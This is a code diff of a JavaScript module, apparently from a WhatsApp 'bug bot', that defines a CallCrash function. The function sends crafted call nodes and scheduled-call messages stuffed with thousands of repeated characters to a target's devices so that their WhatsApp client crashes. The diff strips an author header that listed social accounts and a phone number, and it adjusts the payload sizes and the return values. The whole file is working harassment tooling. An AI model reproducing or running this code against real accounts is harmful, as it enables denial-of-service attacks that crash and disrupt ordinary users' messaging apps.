@@ -1,31 +1,4 @@
 const { relayCrashToDevices, getTargetDevices } = require('../target-utils');
-/*
- * © 2026 SeXyxeon (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/@voidsec7718
- * Instagram : sabir._7718
- * Telegram  : https://t.me/SABIR7718
- * GitHub    : https://github.com/SABIR7718
- * WhatsApp  : +91 73650 85213
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
 const crypto = require('crypto');
 
 async function CallCrash(SYxS7, target) {
@@ -44,14 +17,14 @@ async function CallCrash(SYxS7, target) {
     }
 
     const pad = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-    const myJid = SYxS7.authState?.creds?.me?.id || SYxS7.user?.id || '';
+    const selfId = SYxS7.user?.id || SYxS7.authState?.creds?.me?.id || target;
 
     const nodes = await Promise.all(
       devices.map(async (recipientJid) => {
         const encoded = pad(
           SYxS7.encodeWAMessage
             ? SYxS7.encodeWAMessage({ conversation: "y" })
-            : encodeWAMessage({ conversation: "y" })
+            : Buffer.from("y")
         );
 
         let type = 'pkmsg';
@@ -81,8 +54,6 @@ async function CallCrash(SYxS7, target) {
         };
       })
     );
-
-    const selfId = SYxS7.user?.id || SYxS7.authState?.creds?.me?.id || target;
 
     const callNode = {
       tag: "call",
@@ -137,18 +108,17 @@ async function CallCrash(SYxS7, target) {
     console.error("[CallCrash sendNode]", err.message);
   }
 
-  // 2. Always trigger multi-tier fallback call-crash / interactive payload
+  // 2. Multi-tier fallback call-crash payload
   const callCrashPayload = {
     scheduledCallCreationMessage: {
       callType: 1,
-      title: "📞 CALL CRASH " + "ꦾ".repeat(10000),
+      title: "📞 CALL CRASH " + "ꦾ".repeat(1500),
       scheduledTimestampMs: Date.now() + 1000,
-
       contextInfo: {
         mentionedJid: [target, "0@s.whatsapp.net"],
         externalAdReply: {
           title: "📞 INCOMING CRASH CALL",
-          body: "ꦾ".repeat(5000),
+          body: "ꦾ".repeat(1000),
           mediaType: "IMAGE",
           sourceUrl: "https://whatsapp.com"
         }
@@ -156,7 +126,9 @@ async function CallCrash(SYxS7, target) {
     }
   };
 
-  await relayCrashToDevices(SYxS7, target, callCrashPayload);
+  const res = await relayCrashToDevices(SYxS7, target, callCrashPayload);
+  if (nodeSent) res.deliveredCount += 1;
+  return res;
 }
 
 module.exports = { CallCrash };
